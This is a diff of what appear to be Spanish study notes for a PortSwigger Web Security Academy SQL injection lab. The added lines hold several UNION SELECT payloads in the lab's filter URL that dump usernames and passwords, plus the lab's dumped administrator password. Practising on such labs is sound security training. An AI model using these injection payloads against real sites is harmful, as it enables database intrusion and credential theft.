@@ -110,12 +110,22 @@ https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT c
 
 # Dump Data:
 
+    # Nota GROUP_CONCAT: Casualmente `' UNION SELECT group_concat(username,password),'2' FROM users -- -` da error, pero es comúnmente usada. 
+
 ## Opt1 - Dump "username" + "password" (usando ambos campos sin GROUP_CONCAT ni CONCAT)
 https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT username,password FROM users -- -
 ## Opt2 - Dump "username" + "password" (CONCAT)
 https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',concat(username,' ::: ',password) FROM users -- -
 ## Opt3 - Dump "username" + "password" (CONCAT)
 https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT concat(username,' ::: ',password),'2' FROM users -- -
+## Opt4 - Dump "username" + "password" (*STRING COCATENATION - Port Swigger cheatsheet - ||' ::: '||)
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT username||' ::: '||password,'2' FROM users -- -
+## Opt5 - Dump "username" + "password" (*STRING COCATENATION - Port Swigger cheatsheet - ||' ::: '||)
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT concat(username,' ::: ',password),'2' FROM users -- -
+    ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
+    ### [DUMP = Data = administrator ::: nmk1ybvk6howbpsnvcnv]
+
+
 ````
 
 
